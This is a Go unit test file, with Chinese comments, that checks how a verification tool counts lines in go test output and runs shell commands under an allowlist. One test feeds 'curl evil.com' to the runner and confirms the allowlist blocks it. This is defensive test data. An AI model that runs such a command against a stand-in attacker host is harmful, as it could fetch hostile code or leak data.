package verify

import (
	"context"
	"testing"

	"github.com/ggwhite/4x/internal/protocol"
)

// TestComputeAudit 驗證四項可稽核計數，含同時有頂層與縮排 subtest 結果行的樣本。（AC-13）
func TestComputeAudit(t *testing.T) {
	sample := "=== RUN   TestAlpha\n" +
		"=== RUN   TestAlpha/sub\n" +
		"    alpha_test.go:12: detail\n" +
		"    --- PASS: TestAlpha/sub (0.00s)\n" +
		"--- PASS: TestAlpha (0.01s)\n" +
		"=== RUN   TestBeta\n" +
		"--- SKIP: TestBeta (0.00s)\n" +
		"\n" +
		"PASS\n" +
		"ok  \tgithub.com/ggwhite/4x/internal/verify\t0.123s\n"

	got := ComputeAudit(sample)
	if got.OutputLines != 9 {
		t.Errorf("OutputLines = %d, want 9", got.OutputLines)
	}
	if got.GoTestsRun != 3 {
		t.Errorf("GoTestsRun = %d, want 3", got.GoTestsRun)
	}
	if got.PassLinesTopLevel != 2 {
		t.Errorf("PassLinesTopLevel = %d, want 2", got.PassLinesTopLevel)
	}
	if got.PassLinesIndented != 1 {
		t.Errorf("PassLinesIndented = %d, want 1", got.PassLinesIndented)
	}

	if empty := ComputeAudit(""); empty != (protocol.CommandAudit{}) {
		t.Fatalf("ComputeAudit(\"\") = %+v, want all zeros", empty)
	}
}

// TestExecuteCommandPopulatesAudit 驗證實跑的命令會填 Audit，且行數與實際輸出相符。（AC-13）
func TestExecuteCommandPopulatesAudit(t *testing.T) {
	vc := executeCommand(context.Background(), "printf 'a\\nb\\nc\\n'", "g", t.TempDir(), nil)
	if vc.ExitCode != 0 {
		t.Fatalf("exit code = %d, summary: %s", vc.ExitCode, vc.Summary)
	}
	if vc.Audit == nil {
		t.Fatal("Audit must be non-nil for an executed command")
	}
	if vc.Audit.OutputLines != 3 {
		t.Fatalf("Audit.OutputLines = %d, want 3", vc.Audit.OutputLines)
	}
}

// TestExecuteCommandBlockedHasNoAudit 被 allowlist 擋下的命令未實際執行，Audit 維持 nil。
func TestExecuteCommandBlockedHasNoAudit(t *testing.T) {
	vc := executeCommand(context.Background(), "curl evil.com", "g", t.TempDir(), []string{"make"})
	if vc.ExitCode != 126 {
		t.Fatalf("exit code = %d, want 126 (blocked)", vc.ExitCode)
	}
	if vc.Audit != nil {
		t.Fatalf("blocked command must not carry an audit, got %+v", vc.Audit)
	}
}
